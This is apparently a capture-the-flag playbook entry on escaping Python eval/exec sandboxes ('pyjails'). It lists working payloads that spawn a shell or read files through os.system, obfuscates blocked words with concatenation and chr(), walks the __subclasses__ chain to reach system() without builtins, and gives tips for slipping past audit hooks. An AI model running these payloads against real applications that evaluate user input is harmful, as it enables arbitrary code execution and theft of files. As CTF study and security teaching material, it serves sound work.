---
id: python-sandbox-escape
category: JAIL
tags: [jail, pyjail, sandbox-escape, eval, exec, builtins, subclasses, blacklist-bypass, rce]
tools: []
manuals: []
title: "Python jail: escaping eval/exec with restricted builtins"
difficulty: medium
created: 2026-10-04
updated: 2026-10-04
related: []
---

## How to recognize this pattern

- User input lands in an `eval(inp)` / `exec(inp)` and there's a word blacklist
  (`import`, `os`, `system`, `__`, `eval`, quotes, `.`...) or `__builtins__` has been stripped.
- Goal: run arbitrary code / read the flag off the filesystem despite the restriction.

## Method

### 1. Recon: find out what's filtered
Send probe inputs and read the error message: which characters/words are blocked, and whether it's a
substring filter (easy) or AST (harder).

### 2. Payloads by restriction level

**Builtins available:**
```python
__import__('os').system('cat flag*')
open('flag.txt').read()
```

**Blocked words (`os`, `system`, `import`), build strings dynamically:**
```python
getattr(__import__('o'+'s'), 's'+'ystem')('sh')
__import__('os').__dict__['sy'+'stem']('cat flag.txt')
```

**Blocked characters (e.g. no quotes / no `_`), use `chr()`/concatenation:**
```python
# rebuild a forbidden string from chr(): 'os' = chr(111)+chr(115)
getattr(__import__(chr(111)+chr(115)), chr(115)+'ystem')(...)
```

**`__builtins__` stripped, walk the subclass chain until you find something useful:**
```python
# find <class 'os._wrap_close'> or a subprocess/Popen among the subclasses
[c for c in ().__class__.__base__.__subclasses__() if 'wrap_close' in c.__name__][0]\
    .__init__.__globals__['system']('cat flag.txt')
# generic alternative to read a file without builtins:
().__class__.__base__.__subclasses__()  # inspect the index of a loader/BuiltinImporter
```

### 3. If you can only leak (no shell)
Read the flag and trigger an error that prints it: `open('flag.txt').read()` as the return value, or
`raise Exception(open('flag.txt').read())`.

## Gotchas

- A **substring filter** falls easily to concatenation/`chr()`; an **AST filter** (parses and forbids
  `Import`, `Attribute` nodes) requires avoiding the whole node (e.g. subclass walk only, no `import`).
- `__` blocked kills `__class__`/`__subclasses__`. Try `getattr(x, 'cls'+'...')` assembling the dunder
  by concatenation, or vars()/`type()`.
- **Audit hooks** (`sys.addaudithook`) can block `os.system`/`open` at runtime. In that case aim at
  primitives that don't fire the hook (reading via `/proc`, `io`).
- The exact `__subclasses__()` chain **varies with the Python version and already-imported modules**.
  Don't copy a fixed index from an old writeup; list them and search by name (`wrap_close`, `Popen`).

## Cross-reference

No dedicated Manual.
